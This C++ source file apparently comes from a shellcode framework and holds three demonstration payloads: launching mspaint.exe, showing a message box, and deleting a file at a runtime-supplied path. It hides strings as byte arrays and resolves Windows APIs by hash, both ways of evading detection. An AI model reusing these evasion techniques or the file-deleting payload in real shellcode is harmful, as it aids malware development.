/*
	Author: y11en
	Data: 2020.4
*/

#include "one.h"
#include "sc.h"


using T_MessageBoxA = decltype(&MessageBoxA);
#define H_MessageBoxA 0x06dbe321

void* sc_exec0()
{
	NativeApi func;
	init_api(&func);
	char cmdline[] = { 109, 115, 112, 97, 105, 110, 116, 46, 101, 120, 101 , 0 };	// mspaint.exe
	// char* cmdline = (char*)main_end + (UINT32)get_rtoffset();
	func.winexec(cmdline, SW_SHOW);
	return 0;
}

void* sc_msgbox()
{
	T_MessageBoxA msgbox;
	NativeApi func;
	init_api(&func);

	unsigned char str_tip[] = { 100,97,108,97,111,104,101,108,112,109,101,0 };
	unsigned char str_user32[] = { 117, 115, 101, 114, 51, 50, 46, 100, 108, 108 , 0 };
	HMODULE user32 = func.loadlib((LPCSTR)str_user32);
	GET_FUNC(user32, H_MessageBoxA, msgbox, 0);

	if (msgbox)
	{
		msgbox(0, (char*)main_end + get_rtoffset(), (LPCSTR)str_tip, MB_OK);
	}
	return 0;
}

using T_DeleteFileA = decltype(&DeleteFileA);
#define H_DeleteFileA 0x09a21e5e

void* sc_delfile()
{
	NativeApi func;
	init_api(&func);
	T_DeleteFileA remove = 0;

	GET_FUNC(func.kernel32, H_DeleteFileA, remove, 0);

	if (remove)
	{
		remove((char*)main_end + get_rtoffset());
	}
	return 0;
}